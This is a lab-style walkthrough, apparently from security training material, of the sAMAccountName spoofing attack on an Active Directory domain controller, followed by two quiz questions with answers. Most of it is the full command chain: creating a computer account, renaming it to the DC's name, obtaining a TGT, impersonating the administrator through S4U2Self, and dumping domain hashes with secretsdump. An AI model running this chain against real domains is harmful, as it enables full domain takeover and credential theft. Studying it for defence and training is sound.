#SAMAccountNameSpoofing

This attack revolves around tricking the KDC into thinking an account different from the DC is actually the DC account. This way, an attacker can impersonate a DC in a S4U2Self Kerberos extension and retrieve highly privileged service tickets for any DC service.


To perpetrate this attack, one must use previously retrieved user credentials, and this user must be able to create a computer account. Users can create up to 10 computer accounts in AD by default. The attacker can check how much computer accounts they can create using CME:
```
crackmapexec ldap captain.polaris.local -u skyler.white -p Password123 -d polaris.local -M MAQ
```
It seems that Skyler can create up to 10 computer accounts. Let's create a new one:
```
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host captain.polaris.local -domain-netbios POLARIS 'polaris.local/skyler.white:Password123'
```
Now, the attacker has access to this new account as well. Each account can modify its own SPNs. In this attack, it's necessary to clear out every SPN associated with the newly created account before changing its name:
```
#in the krbrelayx dir
python3 addspn.py --clear -t 'samaccountname$' -u 'polaris.local\skyler.white' -p 'Password123' 'captain.polaris.local'
```

Now, we'll rename the computer account's name to the DC's computer account name, without a trailing '$'. Then, we'll retrieve a TGT that will reference this new name. Once we get the TGT we'll change the computer account name back to its original:

```
#in the samaccountname_scripts dir
python3 ./renameMachine.py -current-name 'samaccountname$' -new-name 'CAPTAIN' -dc-ip 'captain.polaris.local' polaris.local/skyler.white:Password123
getTGT.py -dc-ip 'captain.polaris.local' 'polaris.local'/'CAPTAIN':'ComputerPassword'
python3 ./renameMachine.py -current-name 'CAPTAIN' -new-name 'samaccountname$' -dc-ip 'captain.polaris.local' polaris.local/skyler.white:Password123
```

Now, the attacker can use this TGT and confuse the KDC into believing that the TGT actually belongs to the DC computer account. The attacker can then impersonate the DC in order to obtain a service ticket to a DC service as any user. The attacker will then retrieve a service ticket to the SMB service for the administrator user, and then use this ticket to compromise the domain through a DCSync attack using the secretsdump.py script.

```
export KRB5CCNAME=/home/ubuntu/samaccountname_scripts/CAPTAIN.ccache
python3 ./getST.py -self -impersonate 'administrator' -altservice 'CIFS/captain.polaris.local' -k -no-pass -dc-ip 'captain.polaris.local' 'polaris.local'/'CAPTAIN'
#now we have a service ticket impersonating the administrator to the DC's SMB service. At this point the domain can be compromised
export KRB5CCNAME=/home/ubuntu/samaccountname_scripts/administrator@CIFS_captain.polaris.local@POLARIS.LOCAL.ccache
secretsdump.py -k -no-pass -just-dc -dc-ip 'captain.polaris.local' @'captain.polaris.local'
```

!!! question
    How can the attacker retrieve a service ticket to the DC's SMB service as the Administrator? Through what mechanism?
??? success "Answer"
    The attacker retrieves this ticket using the S4U2Self mechanism, which the DC account is allowed to perform. The attacker makes the KDC believe that it holds a TGT pertaining to the DC, and thus it is eligible to execute the S4U2Self and retrieve a service ticket to a DC service, while impersonating the administrator.
!!! question
    How did the attacker tricked the KDC into believing that the TGT that the attacker holds actually pertains to the DC?
??? success "Answer"
    By first changing a owned computer account name to CAPTAIN (without a '$' at the end). Asking for a TGT, which will reference the CAPTAIN account, and then changing the account name back to the original. Finally, use the TGT, and since there's no CAPTAIN account, the KDC believes the TGT actually belongs to CAPTAIN$, which is the DC's computer account.